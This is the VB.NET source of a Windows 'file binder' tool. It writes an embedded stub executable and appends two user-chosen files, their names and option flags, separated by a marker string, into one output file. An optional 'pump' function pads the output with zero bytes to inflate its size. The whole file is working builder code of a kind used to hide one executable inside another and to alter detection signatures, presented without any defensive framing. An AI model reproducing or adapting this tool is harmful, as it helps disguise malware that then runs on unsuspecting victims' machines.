Imports System.IO

Public Class Form1
    Dim savefile, text1, text2, file1, file2, stub As String
    Dim cb1, cb2 As Boolean
    Const FileSplit = "@onetwothree@"
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        ofd1.ShowDialog()
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        ofd2.ShowDialog()
    End Sub

    Private Sub ofd1_FileOk(ByVal sender As System.Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles ofd1.FileOk
        TextBox1.Text = ofd1.FileName
        text1 = ofd1.FileName.Substring(ofd1.FileName.LastIndexOf("\") + 1)
    End Sub

    Private Sub ofd2_FileOk(ByVal sender As System.Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles ofd2.FileOk
        TextBox2.Text = ofd2.FileName
        text2 = ofd2.FileName.Substring(ofd2.FileName.LastIndexOf("\") + 1)
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Me.Close()
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            cb1 = True
        Else : cb1 = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            cb2 = True
        Else : cb2 = False
        End If
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
       
        sfd1.ShowDialog()
        savefile = sfd1.FileName.Substring(ofd1.FileName.LastIndexOf("\") + 1)
        
        FileOpen(1, TextBox1.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        file1 = Space(LOF(1))
        FileGet(1, file1)
        FileClose(1)

        FileOpen(2, TextBox2.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        file2 = Space(LOF(2))
        FileGet(2, file2)
        FileClose(2)

        Dim b As Byte() = My.Resources.stub
        Dim TheFIlePath As String = Application.StartupPath & "\Stub.exe"
        Dim TempFile As System.IO.FileStream = IO.File.Create(TheFIlePath)
        TempFile.Write(b, 0, b.Length)
        TempFile.Close()

        FileOpen(3, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(3))
        FileGet(3, stub)
        FileClose(3)
        FileOpen(3, savefile, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(3, stub & FileSplit & file1 & FileSplit & file2 & FileSplit & text1 & FileSplit & text2 & FileSplit & cb1 & FileSplit & cb2)
        FileClose(3)
        System.IO.File.Delete(Application.StartupPath & ("\Stub.exe"))
        If CheckBox3.Checked = True Then
            ExePump(savefile, NumericUpDown1.Value)
            MsgBox("File size has been increased by " & (NumericUpDown1.Text) & (" Kb!"))
        End If
        MsgBox("Binded")
        Me.Close()
        End
    End Sub
    Function ExePump(ByVal File As String, ByVal Bytes As Integer) As Object

        Dim buffer As Byte() = New Byte(((Bytes * 1024) + 1) - 1) {}
        Dim stream As New FileStream(File, FileMode.Append)
        Try
            stream.Seek(0, SeekOrigin.End)
            Dim num2 As Integer = (buffer.Length - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                stream.WriteByte(buffer(i))
                i += 1
            Loop
        Finally
            stream.Close()
        End Try
    End Function

    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            NumericUpDown1.Enabled = True
        Else : NumericUpDown1.Enabled = False
        End If
    End Sub

   
    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        System.Diagnostics.Process.Start("Http://www.natespages.ucoz.com")
    End Sub
End Class
